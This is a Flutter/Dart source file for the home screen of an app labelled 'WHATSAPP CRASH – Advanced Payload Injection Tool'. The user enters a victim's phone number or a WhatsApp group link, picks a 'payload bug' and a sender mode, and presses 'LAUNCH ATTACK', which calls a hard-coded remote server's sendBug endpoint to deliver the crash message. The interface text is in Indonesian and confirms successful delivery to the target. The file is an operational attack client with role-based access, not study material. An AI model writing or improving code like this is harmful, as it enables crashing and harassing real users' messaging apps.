import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'widgets/custom_popup.dart';
import 'bug_sender.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _pulseController;
  String selectedBugId = "";
  VideoPlayerController? _videoController;

  String _selectedBugMode = "number";
  String _senderMode = "private";
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;

  bool _isSending = false;

  // ===== COLOR PALETTE - MINECRAFT THEME =====
  static const Color bgMain = Color(0xFF1A1A1A);          // Obsidian
  static const Color bgSurface = Color(0xFF2D2D2D);       // Stone
  static const Color bgCard = Color(0xFF3D3D3D);          // Cobblestone
  static const Color textMain = Color(0xFFE8E8E8);        // White wool
  static const Color textSub = Color(0xFFAAAAAA);         // Gray
  static const Color accentWhite = Color(0xFF4CAF50);     // Grass green
  static const Color borderLight = Color(0xFF5D5D5D);     // Stone border
  static const Color mcGold = Color(0xFFFFD700);          // Gold
  static const Color mcDiamond = Color(0xFF4DD0E1);       // Diamond
  static const Color mcRedstone = Color(0xFFFF5252);      // Redstone
  static const Color mcEmerald = Color(0xFF00E676);       // Emerald

  @override
  void initState() {
    super.initState();

    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        setState(() {});
        _videoController?.setVolume(1.0);
        _videoController?.setLooping(true);
        _videoController?.play();
      });

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    if (widget.listBug.isNotEmpty) {
      final initialBugs = _getFilteredBugs();
      if (initialBugs.isNotEmpty) {
        selectedBugId = initialBugs[0]['bug_id'];
      }
    }

    _fetchSenderStats();
  }

  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "group") {
      return widget.listBug.where((b) => b['bug_id'].contains('_group')).toList();
    } else {
      return widget.listBug.where((b) => !b['bug_id'].contains('_group')).toList();
    }
  }

  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "http://dwixclouds.cloudnesia.my.id:3013/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching sender stats: $e");
    }
  }

  @override
  void dispose() {
    _videoController?.dispose();
    _pulseController.dispose();
    targetController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    final currentBugs = _getFilteredBugs();
    if (!currentBugs.any((b) => b['bug_id'] == selectedBugId)) {
      if (currentBugs.isNotEmpty) {
        setState(() {
          selectedBugId = currentBugs[0]['bug_id'];
        });
      } else {
        _showAlert("Error", "Tidak ada bug tersedia untuk mode ini.");
        return;
      }
    }

    setState(() {
      _isSending = true;
    });

    final effectiveSenderMode = (widget.role == 'owner' || widget.role == 'vip')
        ? _senderMode
        : 'private';

    try {
      final res = await http.get(Uri.parse(
          "http://dwixclouds.cloudnesia.my.id:3013/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderMode=$effectiveSenderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
      } else if (data["valid"] == false) {
        _showAlert("Key Invalid", "Sesi Anda tidak valid. Silakan login ulang.");
      } else if (data["sended"] == false) {
        _showAlert("Gagal", "Server sedang maintenance atau terjadi kegagalan.");
      } else {
        _showAlert("Berhasil", "Bug sukses dikirim ke target!");
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      _showAlert("Error", "Terjadi kesalahan pada sistem. Coba lagi nanti.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  void _showAlert(String title, String msg) {
    if (!mounted) return;
    final isSuccess = title.toLowerCase().contains("berhasil");
    CustomPopup.display(
      context,
      title: title,
      message: msg,
      icon: isSuccess ? Icons.check_circle_outline : Icons.error_outline,
      iconColor: isSuccess ? mcEmerald : mcRedstone,
      confirmText: "Close",
    );
  }

  // ===== TOP HEADER - MINECRAFT STYLE =====
  Widget _buildTopHeader() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: bgCard,
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: mcRedstone, width: 3),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.7),
            blurRadius: 0,
            offset: const Offset(6, 6),
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: bgSurface,
              border: Border.all(color: mcRedstone, width: 3),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(3, 3),
                )
              ],
            ),
            child: const Icon(Icons.bug_report_outlined, color: mcRedstone, size: 28),
          ),
          const SizedBox(width: 16),
          const Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "WHATSAPP CRASH",
                  style: TextStyle(
                    color: textMain,
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                    letterSpacing: 1.5,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                SizedBox(height: 6),
                Text(
                  "Advanced Payload Injection Tool",
                  style: TextStyle(
                    color: textSub,
                    fontSize: 11,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ===== SELECTION BUTTON - MINECRAFT STYLE =====
  Widget _buildSelectionButton({
    required String title,
    required String value,
    required IconData icon,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          color: bgCard,
          borderRadius: BorderRadius.circular(4),
          border: Border.all(color: accentWhite, width: 3),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.7),
              blurRadius: 0,
              offset: const Offset(4, 4),
            ),
          ],
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: bgSurface,
                border: Border.all(color: accentWhite, width: 2),
              ),
              child: Icon(icon, color: accentWhite, size: 22),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: const TextStyle(
                      color: textSub,
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.2,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    value,
                    style: const TextStyle(
                      color: textMain,
                      fontSize: 13,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 0.5,
                      shadows: [
                        Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            const Icon(Icons.keyboard_arrow_right_rounded, color: accentWhite, size: 28),
          ],
        ),
      ),
    );
  }

  // ===== POPUP OPTION - MINECRAFT STYLE =====
  Widget _buildPopupOption({
    required IconData icon,
    required Color color,
    required String title,
    String? sub,
    required VoidCallback onTap,
  }) {
    return InkWell(
      onTap: onTap,
      child: Container(
        margin: const EdgeInsets.only(bottom: 10),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: bgSurface,
          border: Border.all(color: color, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.5),
              blurRadius: 0,
              offset: const Offset(3, 3),
            )
          ],
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: color.withOpacity(0.15),
                border: Border.all(color: color, width: 2),
              ),
              child: Icon(icon, color: color, size: 24),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: const TextStyle(
                      color: textMain,
                      fontWeight: FontWeight.bold,
                      fontSize: 12,
                      letterSpacing: 0.5,
                    ),
                  ),
                  if (sub != null)
                    Text(
                      sub,
                      style: const TextStyle(
                        color: textSub,
                        fontSize: 10,
                      ),
                    ),
                ],
              ),
            ),
            Icon(Icons.arrow_forward_ios, color: textSub, size: 14),
          ],
        ),
      ),
    );
  }

  // ===== TARGET TYPE POPUP - MINECRAFT STYLE =====
  void _showTargetTypePopup() {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.75),
      builder: (context) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Dialog(
          backgroundColor: Colors.transparent,
          elevation: 0,
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: bgCard,
              borderRadius: BorderRadius.circular(4),
              border: Border.all(color: accentWhite, width: 3),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.8),
                  blurRadius: 0,
                  offset: const Offset(8, 8),
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const Text(
                  "PILIH TARGET",
                  style: TextStyle(
                    color: textMain,
                    fontSize: 15,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1.2,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const SizedBox(height: 20),
                _buildPopupOption(
                  icon: Icons.phone_android_rounded,
                  color: accentWhite,
                  title: "BUG NOMOR",
                  onTap: () {
                    setState(() {
                      _selectedBugMode = "number";
                      targetController.clear();
                      final newBugs = _getFilteredBugs();
                      if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
                    });
                    Navigator.pop(context);
                  },
                ),
                _buildPopupOption(
                  icon: Icons.group_add,
                  color: accentWhite,
                  title: "BUG GROUP",
                  onTap: () {
                    setState(() {
                      _selectedBugMode = "group";
                      targetController.clear();
                      final newBugs = _getFilteredBugs();
                      if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
                    });
                    Navigator.pop(context);
                  },
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ===== SENDER TYPE POPUP - MINECRAFT STYLE =====
  void _showSenderTypePopup() {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.75),
      builder: (context) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Dialog(
          backgroundColor: Colors.transparent,
          elevation: 0,
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: bgCard,
              borderRadius: BorderRadius.circular(4),
              border: Border.all(color: mcDiamond, width: 3),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.8),
                  blurRadius: 0,
                  offset: const Offset(8, 8),
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const Text(
                  "PILIH SENDER",
                  style: TextStyle(
                    color: textMain,
                    fontSize: 15,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1.2,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const SizedBox(height: 20),
                _buildPopupOption(
                  icon: Icons.person_outline,
                  color: mcDiamond,
                  title: "PRIVATE ($_privateSenderCount Active)",
                  onTap: () {
                    setState(() => _senderMode = 'private');
                    Navigator.pop(context);
                  },
                ),
                _buildPopupOption(
                  icon: Icons.public,
                  color: mcDiamond,
                  title: "GLOBAL ($_globalSenderCount Active)",
                  onTap: () {
                    setState(() => _senderMode = 'global');
                    Navigator.pop(context);
                  },
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ===== INPUT PANEL - MINECRAFT STYLE =====
  Widget _buildInputPanel() {
    final availableBugs = _getFilteredBugs();

    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        _buildSelectionButton(
          title: "TARGET TYPE",
          value: _selectedBugMode == "number" ? "BUG NOMOR" : "BUG GROUP",
          icon: _selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.group_add,
          onTap: _showTargetTypePopup,
        ),
        const SizedBox(height: 16),

        _buildSelectionButton(
          title: "MANAGE ACTIVE SENDERS",
          value: "MANAGE BUG SENDER",
          icon: Icons.sensors,
          onTap: () {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (_) => BugSenderPage(
                  sessionKey: widget.sessionKey,
                  username: widget.username,
                  role: widget.role,
                ),
              ),
            );
          },
        ),
        const SizedBox(height: 16),

        if (widget.role == 'owner' || widget.role == 'vip') ...[
          _buildSelectionButton(
            title: "SENDER MODE",
            value: _senderMode == 'private' ? "PRIVATE SENDER" : "GLOBAL SENDER",
            icon: _senderMode == 'private' ? Icons.person_outline : Icons.public,
            onTap: _showSenderTypePopup,
          ),
          const SizedBox(height: 24),
        ],

        // LABEL INPUT TARGET
        Padding(
          padding: const EdgeInsets.only(left: 4, bottom: 8),
          child: Text(
            _selectedBugMode == "number" ? "TARGET NUMBER" : "WHATSAPP GROUP LINK",
            style: const TextStyle(
              color: textMain,
              fontWeight: FontWeight.bold,
              fontSize: 11,
              letterSpacing: 1.5,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
          ),
        ),

        // TEXTFIELD TARGET - MINECRAFT STYLE
        TextField(
          controller: targetController,
          style: const TextStyle(color: textMain, fontSize: 14),
          cursorColor: accentWhite,
          cursorWidth: 3,
          keyboardType: _selectedBugMode == "number" ? TextInputType.phone : TextInputType.url,
          decoration: InputDecoration(
            hintText: _selectedBugMode == "number"
                ? "e.g. +628xxxxxxxx"
                : "e.g. https://chat.whatsapp.com/...",
            hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12),
            filled: true,
            fillColor: bgSurface,
            border: const OutlineInputBorder(
              borderRadius: BorderRadius.zero,
              borderSide: BorderSide(color: accentWhite, width: 3),
            ),
            enabledBorder: const OutlineInputBorder(
              borderRadius: BorderRadius.zero,
              borderSide: BorderSide(color: accentWhite, width: 3),
            ),
            focusedBorder: const OutlineInputBorder(
              borderRadius: BorderRadius.zero,
              borderSide: BorderSide(color: mcGold, width: 3),
            ),
            prefixIcon: Icon(
              _selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.link,
              color: accentWhite,
            ),
            contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 20),
          ),
        ),

        const SizedBox(height: 24),

        if (availableBugs.isNotEmpty) ...[
          const Padding(
            padding: EdgeInsets.only(left: 4, bottom: 8),
            child: Text(
              "SELECT PAYLOAD BUG",
              style: TextStyle(
                color: textMain,
                fontWeight: FontWeight.bold,
                fontSize: 11,
                letterSpacing: 1.5,
                shadows: [
                  Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                ],
              ),
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 4),
            decoration: BoxDecoration(
              color: bgSurface,
              borderRadius: BorderRadius.circular(4),
              border: Border.all(color: accentWhite, width: 3),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(4, 4),
                ),
              ],
            ),
            child: DropdownButtonHideUnderline(
              child: DropdownButton<String>(
                dropdownColor: bgSurface,
                value: selectedBugId.isNotEmpty ? selectedBugId : null,
                isExpanded: true,
                icon: const Icon(Icons.keyboard_arrow_down_rounded, color: accentWhite),
                iconSize: 28,
                style: const TextStyle(
                  color: textMain,
                  fontSize: 13,
                  fontWeight: FontWeight.bold,
                ),
                items: availableBugs.map((bug) {
                  return DropdownMenuItem<String>(
                    value: bug['bug_id'],
                    child: Row(
                      children: [
                        const Icon(Icons.bug_report, color: accentWhite, size: 20),
                        const SizedBox(width: 12),
                        Expanded(
                          child: Text(
                            bug['bug_name'],
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                      ],
                    ),
                  );
                }).toList(),
                onChanged: (value) {
                  setState(() {
                    selectedBugId = value ?? "";
                  });
                },
              ),
            ),
          ),
        ] else ...[
          const Center(
            child: Padding(
              padding: EdgeInsets.all(16.0),
              child: Text(
                "No payload available for this mode.",
                style: TextStyle(color: textSub, fontSize: 12),
              ),
            ),
          )
        ]
      ],
    );
  }

  // ===== SEND BUTTON - MINECRAFT STYLE =====
  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        return Container(
          height: 60,
          decoration: BoxDecoration(
            color: bgCard,
            border: Border.all(
              color: mcRedstone.withOpacity(0.6 + _pulseController.value * 0.4),
              width: 3,
            ),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.7),
                blurRadius: 0,
                offset: const Offset(5, 5),
              ),
              BoxShadow(
                color: mcRedstone.withOpacity(_pulseController.value * 0.3),
                blurRadius: 15,
                spreadRadius: 2,
              ),
            ],
          ),
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendBug,
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.transparent,
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.zero,
              ),
              elevation: 0,
              shadowColor: Colors.transparent,
            ),
            child: _isSending
                ? const SizedBox(
                    height: 24,
                    width: 24,
                    child: CircularProgressIndicator(
                      color: textMain,
                      strokeWidth: 3,
                    ),
                  )
                : const Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.rocket_launch_outlined, color: mcRedstone, size: 22),
                      SizedBox(width: 12),
                      Text(
                        "LAUNCH ATTACK",
                        style: TextStyle(
                          color: textMain,
                          fontWeight: FontWeight.bold,
                          fontSize: 13,
                          letterSpacing: 2,
                          shadows: [
                            Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                          ],
                        ),
                      ),
                    ],
                  ),
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgMain,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [bgMain, bgSurface, bgMain],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 24),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                _buildTopHeader(),
                const SizedBox(height: 20),

                // VIDEO - MINECRAFT STYLE FRAME
                if (_videoController != null && _videoController!.value.isInitialized)
                  Container(
                    height: 220,
                    width: double.infinity,
                    decoration: BoxDecoration(
                      color: bgCard,
                      border: Border.all(color: accentWhite, width: 3),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withOpacity(0.7),
                          blurRadius: 0,
                          offset: const Offset(5, 5),
                        ),
                      ],
                    ),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(1),
                      child: SizedBox.expand(
                        child: FittedBox(
                          fit: BoxFit.cover,
                          child: SizedBox(
                            width: _videoController!.value.size.width,
                            height: _videoController!.value.size.height,
                            child: VideoPlayer(_videoController!),
                          ),
                        ),
                      ),
                    ),
                  ),
                const SizedBox(height: 20),

                _buildInputPanel(),
                const SizedBox(height: 30),

                _buildSendButton(),
                const SizedBox(height: 40),
              ],
            ),
          ),
        ),
      ),
    );
  }
}